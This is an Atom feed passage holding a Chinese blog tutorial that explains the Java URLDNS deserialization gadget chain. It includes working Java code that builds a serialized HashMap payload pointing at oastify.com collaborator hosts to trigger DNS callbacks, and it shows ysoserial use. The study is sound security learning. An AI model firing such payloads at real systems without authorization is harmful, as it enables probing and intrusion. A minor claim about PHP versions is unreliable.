<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://usingns.github.io/atom.xml" rel="self"/>
  
  <link href="https://usingns.github.io/"/>
  <updated>2025-07-15T10:05:26.008Z</updated>
  <id>https://usingns.github.io/</id>
  
  <author>
    <name>us1n9ns</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>URLDNS反序列化利用链(从百草园写到三味书屋)</title>
    <link href="https://usingns.github.io/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/"/>
    <id>https://usingns.github.io/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/</id>
    <published>2025-07-15T09:33:11.000Z</published>
    <updated>2025-07-15T10:05:26.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="选择原因：环境要求少"><a href="#选择原因：环境要求少" class="headerlink" title="选择原因：环境要求少"></a>选择原因：环境要求少</h1><p><mark>少有的对环境没有什么要求的链子</mark><br>作用：被反序列化的时候发起DNS请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><h1 id="简单演示利用过程"><a href="#简单演示利用过程" class="headerlink" title="简单演示利用过程"></a>简单演示利用过程</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    // 序列化：将对象写入文件</span><br><span class="line"></span><br><span class="line">    public static void serialize(String path, Object obj) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(path))) &#123;</span><br><span class="line"></span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;对象已序列化写入文件：&quot; + path);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    // 反序列化：从文件中读取对象</span><br><span class="line"></span><br><span class="line">    public static Object deserialize(String path) throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path))) &#123;</span><br><span class="line"></span><br><span class="line">            Object obj = ois.readObject();</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;对象已从文件反序列化：&quot; + path);</span><br><span class="line"></span><br><span class="line">            return obj;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        // 从文件反序列化对象（文件名应存在）</span><br><span class="line"></span><br><span class="line">        Object obj = deserialize(&quot;urldns.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 实例化一个 HashMap（没用上，仅作为演示）</span><br><span class="line"></span><br><span class="line">        new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用yso生成访问<a href="http://ygik9waxo2t8418l9pu8cffnaeg54wykn.oastify.com的bin文件/">http://ygik9waxo2t8418l9pu8cffnaeg54wykn.oastify.com的bin文件</a><br>使得程序反序列化该二进制文件</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/1.png" class=""><h1 id="分析链子"><a href="#分析链子" class="headerlink" title="分析链子"></a>分析链子</h1><p>再看回链子的调用过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><h2 id="最后一步getHostAddress"><a href="#最后一步getHostAddress" class="headerlink" title="最后一步getHostAddress()"></a>最后一步getHostAddress()</h2><p>URL类重写了hashCode()函数</p><p>URL.hashCode()</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/2.png" class=""><p>实现了序列化接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#URL.hashCode()</span><br><span class="line"></span><br><span class="line">    public synchronized int hashCode() &#123;</span><br><span class="line"></span><br><span class="line">        if (hashCode != -1)</span><br><span class="line"></span><br><span class="line">            return hashCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(this);</span><br><span class="line"></span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>判断是否等于-1<br>然后<mark>调用hashcode()</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#hashcode()</span><br><span class="line"></span><br><span class="line">protected int hashCode(URL u) &#123;</span><br><span class="line"></span><br><span class="line">        int h = 0;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        // Generate the protocol part.</span><br><span class="line"></span><br><span class="line">        String protocol = u.getProtocol();</span><br><span class="line"></span><br><span class="line">        if (protocol != null)</span><br><span class="line"></span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        // Generate the host part.</span><br><span class="line"></span><br><span class="line">        InetAddress addr = getHostAddress(u);</span><br><span class="line"></span><br><span class="line">        if (addr != null) &#123;</span><br><span class="line"></span><br><span class="line">            h += addr.hashCode();</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line"></span><br><span class="line">            String host = u.getHost();</span><br><span class="line"></span><br><span class="line">            if (host != null)</span><br><span class="line"></span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">        // Generate the file part.</span><br><span class="line"></span><br><span class="line">        String file = u.getFile();</span><br><span class="line"></span><br><span class="line">        if (file != null)</span><br><span class="line"></span><br><span class="line">            h += file.hashCode(...</span><br></pre></td></tr></table></figure><p>关键在        InetAddress addr &#x3D; getHostAddress(u);<br>这里是一个是从主机获取ip地址</p><h2 id="如何一步步调用"><a href="#如何一步步调用" class="headerlink" title="如何一步步调用"></a>如何一步步调用</h2><p>HashMap里面的readObject()也是被重写过的，且符合固定签名的，所以反序列化的时候会被一并执行</p><p>里面有一段功能是读取键和值，然后放进映射的Hashmap中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Read the keys and values, and put the mappings in the HashMap</span><br><span class="line"></span><br><span class="line">for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line"></span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line"></span><br><span class="line">        K key = (K) s.readObject();</span><br><span class="line"></span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line"></span><br><span class="line">        V value = (V) s.readObject();</span><br><span class="line"></span><br><span class="line">    putVal(hash(key), key, value, false, false);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HashMap中存储的都是键值对，键是一个对象，值也是一个对象，在反序列化的时候会把其中存储的对象都一个个恢复过来，键和值也是调用了readObject()反序列化回来的，并且执行了一个关键操作putVal()函数。这个函数的第一个传参就是hash(key)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, false, false)</span><br></pre></td></tr></table></figure><p>在反序列化存储键和值的时候，执行了一个Hash函数，重新去计算Key的Hash值</p><p>我们点进这个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line"></span><br><span class="line">    int h;</span><br><span class="line"></span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的是一个对象key，有一步会计算key的hashCode即<mark>key.hashCode()</mark>，如何对象等于NULL，也就是这个对象不存在，那么它的HashCode就赋值为0，如果存在的话就会调用这个对象的HashCode函数</p><p><mark>也就是说在这一步的时候，HashMap类的重写过的并且在反序列化的时候会被调用的readObject()函数会使用函数putVal()去调用了反序列化对象的HasCode()函数</mark></p><p>而当这个对象是URL类实例对象的时候，就很有意思了。<br>因为URL的HashCode()我们之前分析过，是被重写过的，是在进行和-1的比较之后，进行再一次的HashCode()函数运算的，而再一步的HashCode()函数运算我们之前已经分析过了，是会对域名进行一次DNS请求以获得ip的，这样就连起来了。</p><p>不过这里的hashCode需要等于-1，即URL实例化对象的hashCode &#x3D; -1</p><p>还有一个就是URL在HashMap中，需要作为key值存在<br>也就是需要new HashMap&lt;URL,Object&gt;();</p><p>但是这里还有一个问题就是链子里面为什么会有HashMap.hash()</p><p>是因为<code>HashMap</code> 在反序列化过程中，重写了 <code>readObject()</code> 方法，重新计算 key 的 <code>hashCode()</code> 是为了将键值对插入到正确的哈希桶（bucket）中，从而重建哈希表结构。因为序列化过程中只保存了键值对，而没有保存内部的哈希数组结构（如 bucket 索引），所以反序列化后需要通过 <code>hashCode()</code> 重建哈希索引结构。这就是官方为什么要这么做的原因，我们当然也需要触发这个才能反序列化成一个正确的结果。</p><p>不过要知道new HashMap&lt;URL,Object&gt;()里面的Object的hashCode()是一个native方法，一般它的值是内存地址，这个hashcode的作用是比较两个内存是否相等，如果对象的hashcode一致就说明相等就这肯定是同一个对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">//代码没复制全</span><br><span class="line">    public native int hashCode();</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line"></span><br><span class="line">     * Indicates whether some other object is &quot;equal to&quot; this one.</span><br><span class="line"></span><br><span class="line">     * &lt;p&gt;</span><br><span class="line"></span><br><span class="line">     * The &#123;@code equals&#125; method implements an equivalence relation</span><br><span class="line"></span><br><span class="line">     * on non-null object references:</span><br><span class="line"></span><br><span class="line">     * &lt;ul&gt;</span><br><span class="line"></span><br><span class="line">     * &lt;li&gt;It is &lt;i&gt;reflexive&lt;/i&gt;: for any non-null reference value</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x&#125;, &#123;@code x.equals(x)&#125; should return</span><br><span class="line"></span><br><span class="line">     *     &#123;@code true&#125;.</span><br><span class="line"></span><br><span class="line">     * &lt;li&gt;It is &lt;i&gt;symmetric&lt;/i&gt;: for any non-null reference values</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x&#125; and &#123;@code y&#125;, &#123;@code x.equals(y)&#125;</span><br><span class="line"></span><br><span class="line">     *     should return &#123;@code true&#125; if and only if</span><br><span class="line"></span><br><span class="line">     *     &#123;@code y.equals(x)&#125; returns &#123;@code true&#125;.</span><br><span class="line"></span><br><span class="line">     * &lt;li&gt;It is &lt;i&gt;transitive&lt;/i&gt;: for any non-null reference values</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x&#125;, &#123;@code y&#125;, and &#123;@code z&#125;, if</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x.equals(y)&#125; returns &#123;@code true&#125; and</span><br><span class="line"></span><br><span class="line">     *     &#123;@code y.equals(z)&#125; returns &#123;@code true&#125;, then</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x.equals(z)&#125; should return &#123;@code true&#125;.</span><br><span class="line"></span><br><span class="line">     * &lt;li&gt;It is &lt;i&gt;consistent&lt;/i&gt;: for any non-null reference values</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x&#125; and &#123;@code y&#125;, multiple invocations of</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x.equals(y)&#125; consistently return &#123;@code true&#125;</span><br><span class="line"></span><br><span class="line">     *     or consistently return &#123;@code false&#125;, provided no</span><br><span class="line"></span><br><span class="line">     *     information used in &#123;@code equals&#125; comparisons on the</span><br><span class="line"></span><br><span class="line">     *     objects is modified.</span><br><span class="line"></span><br><span class="line">     * &lt;li&gt;For any non-null reference value &#123;@code x&#125;,</span><br><span class="line"></span><br><span class="line">     *     &#123;@code x.equals(null)&#125; should return &#123;@code false&#125;.</span><br><span class="line"></span><br><span class="line">     * &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">     * &lt;p&gt;</span><br><span class="line">     后面的代码没贴上...这里是用来补充说明，知道是干什么的就行了</span><br></pre></td></tr></table></figure><p>如果使用原生的hashcode的话确实可能会出现明明是两个一样的对象却取不到相等的问题，因为比较的是内存地址。</p><h2 id="亲手构造"><a href="#亲手构造" class="headerlink" title="亲手构造"></a>亲手构造</h2><p>像是前面的yso工具使用，进行反序列化，我们同样可以手搓一个链子，其实链子很简单</p><p>把之前的代码改成这个样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    // 从文件反序列化对象（文件名应存在）</span><br><span class="line"></span><br><span class="line">    Object obj = deserialize(&quot;urldns.bin&quot;);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    // 实例化一个 HashMap（没用上，仅作为演示）</span><br><span class="line"></span><br><span class="line">    HashMap&lt;URL,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    map.put(new URL(&quot;http://iqcz9l67slpsptzhs8ce04xmkdq4eu2j.oastify.com&quot;), null);</span><br></pre></td></tr></table></figure><p>不过接下来还不能直接序列化，一个是URL的hashCode！&#x3D;-1，一个是这里的put传入的时候会请求调用这个，但是一开始的值还不能是-1。</p><p>什么意思呢，意思就是说我们调用的最后一步URL.hachCode()的时候需要等于-1，这样才能触发新一次hash计算从而请求ip。我们还需要在put进HashMap类的时候不是-1，这里有一个很大的易错点，首先我们点进map.put</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line"></span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的K是一个虚方法，虚方法是Java应对继承和多态的方法即支持动态绑定，它是什么类K就动态变成什么类，你调用的方法就是什么类的方法，是通过虚方法表指针所实现。</p><p>此外所有非static、非final、非private的方法默认都是虚方法（JLS 15.12.4.4），也就是说：<br>    <code>public void foo() &#123;&#125;</code> 是虚方法；<br>    <code>private void bar()</code> 不是虚方法，编译器会静态绑定；<br> <code>final void baz()</code> 不是虚方法，调用时静态绑定。</p><ul><li>静态方法和构造方法不是虚方法。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Animal &#123;</span><br><span class="line">    void sound() &#123; System.out.println(&quot;Animal sound&quot;); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Dog extends Animal &#123;</span><br><span class="line">    @Override</span><br><span class="line">    void sound() &#123; System.out.println(&quot;Woof&quot;); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Animal a = new Dog();</span><br><span class="line">a.sound();  // 输出 &quot;Woof&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>说回刚才的地方，首先我们点进map.put</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line"></span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line">    //这里也就是 return putVal(hash(url), key, value, false, true);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hash(url)执行hashMap类的hash()方法，点击进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  static final int hash(Object key) &#123;</span><br><span class="line"></span><br><span class="line">      int h;</span><br><span class="line"></span><br><span class="line">      return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">      //这里也就是return (key == null) ? 0 : (h = url.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">//url是K虚方法类型，所以动态为URL.hashCode()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>那URL.hashCode()干了什么？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line"></span><br><span class="line">    if (hashCode != -1)</span><br><span class="line"></span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line"></span><br><span class="line">    return hashCode;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行了-1的比较，这就是开始的hashCode我们为什么需要她！&#x3D;-1，然后等于-1，所以进行这里的计算hashCode &#x3D; handler.hashCode(this);直接把恶意url传入this里，也就是分析链子的第一步所讲的，触发了请求ip</p><p>操作就很简单了，开始把url拿出来，通过反射机制修改它的hashCode，反射机制之前的文章写了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"></span><br><span class="line">URL url = new URL(&quot;http://kma15n29onlulvvjoa8gw6togfm6axym.oastify.com&quot;);</span><br><span class="line"></span><br><span class="line">Field hashCode = URL.class.getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line"></span><br><span class="line">hashCode.setAccessible(true);</span><br><span class="line"></span><br><span class="line">hashCode.setInt(url, 24);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">HashMap&lt;URL,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">map.put(url, null);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">hashCode.setInt(url, -1);</span><br><span class="line"></span><br><span class="line">serialize(&quot;url.bin&quot;,map);</span><br></pre></td></tr></table></figure><p>会发现生成url.bin，反序列化该文件拿到结果，大功告成</p><img src="/2025/07/15/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%8E%E7%99%BE%E8%8D%89%E5%9B%AD%E5%86%99%E5%88%B0%E4%B8%89%E5%91%B3%E4%B9%A6%E5%B1%8B/3.png" class=""><p><mark>不过所有的前提都是这些类实现了序列化</mark><br><mark>public class xx implements java.io.Serializable</mark><br><mark>这样才能通过序列化和反序列化进行构造</mark></p><h1 id="关于readObject-特殊性的说明"><a href="#关于readObject-特殊性的说明" class="headerlink" title="关于readObject()特殊性的说明"></a>关于readObject()特殊性的说明</h1><h2 id="特别区分"><a href="#特别区分" class="headerlink" title="特别区分"></a>特别区分</h2><p>首先在反序列化的时候，对象的所有变量方法都会被调用吗？<mark>当然不是</mark></p><h3 id="Java中的反序列化"><a href="#Java中的反序列化" class="headerlink" title="Java中的反序列化"></a>Java中的反序列化</h3><h4 id="1-基础机制"><a href="#1-基础机制" class="headerlink" title="1.基础机制"></a>1.基础机制</h4><p>Java 反序列化时会执行：</p><ul><li>构造对象（绕过构造器 <code>constructor</code>）</li><li>如果类定义了 <code>private void readObject(ObjectInputStream in)</code> 方法，则会调用它进行反序列化定制处理。</li><li>成员变量被还原</li></ul><h4 id="2-不会被调用的东西"><a href="#2-不会被调用的东西" class="headerlink" title="2.不会被调用的东西"></a>2.不会被调用的东西</h4><ul><li>不会调用构造函数（constructor）</li><li>不会自动调用普通方法</li><li>静态变量不会被还原</li><li>transient 修饰的变量不会被反序列化还原</li></ul><h4 id="3-调用顺序"><a href="#3-调用顺序" class="headerlink" title="3. 调用顺序"></a>3. 调用顺序</h4><p>如果类实现了 <code>Serializable</code> 且存在：<br><code>private void readObject(ObjectInputStream in)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">那么反序列化过程大致为：</span><br><span class="line">`ObjectInputStream.readObject() → </span><br><span class="line">构造对象实例（跳过构造器） → </span><br><span class="line">调用 readObject(in) 方法（如果有） → </span><br><span class="line">返回还原好的对象`</span><br></pre></td></tr></table></figure><p><strong>注意：readObject() 是关键点，是链式调用的入口。</strong></p><h3 id="PHP-中反序列化行为"><a href="#PHP-中反序列化行为" class="headerlink" title="PHP 中反序列化行为"></a>PHP 中反序列化行为</h3><h4 id="1-可能会调用的方法"><a href="#1-可能会调用的方法" class="headerlink" title="1. 可能会调用的方法"></a>1. 可能会调用的方法</h4><p>魔术方法<br><code>function __wakeup() &#123;&#125;</code></p><p>那么反序列化过程中，<code>__wakeup()</code> 会在对象还原后被自动调用。</p><h4 id="2-不会调用构造函数-construct"><a href="#2-不会调用构造函数-construct" class="headerlink" title="2. 不会调用构造函数 __construct()"></a>2. 不会调用构造函数 <code>__construct()</code></h4><p>也不会调用普通方法，除非通过魔术函数触发（如 <code>__call()</code>）。</p><h4 id="3-属性还原"><a href="#3-属性还原" class="headerlink" title="3. 属性还原"></a>3. 属性还原</h4><ul><li>所有公开&#x2F;受保护&#x2F;私有属性会被还原</li><li>静态属性不会被还原（因为不是实例级的）</li></ul><h4 id="4-特殊点"><a href="#4-特殊点" class="headerlink" title="4. 特殊点"></a>4. 特殊点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP 7+ 引入了 Serializable 接口（注意和 Java 名字一样，但作用不同）：</span><br><span class="line"></span><br><span class="line">interface Serializable &#123;  </span><br><span class="line">public function serialize();  </span><br><span class="line">public function unserialize($data); &#125;</span><br><span class="line"></span><br><span class="line">如果类实现了该接口，那么 unserialize() 会自动调用 